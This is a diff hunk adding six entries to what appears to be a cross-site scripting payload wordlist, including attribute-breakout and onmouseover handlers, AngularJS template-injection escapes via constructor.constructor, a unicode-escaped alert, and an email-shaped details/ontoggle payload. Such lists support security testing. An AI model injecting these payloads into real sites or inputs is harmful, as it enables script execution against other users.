@@ -135,3 +135,9 @@
 "><textarea><img src="javascript:alert(1)">
 "><body onload=alert(1)>
 "><body onpageshow=alert(1)>
+"style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.domain)"
+{{_c.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+toString=\u0061lert;window+' '
+toString=\u0061lert;window+''
+"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
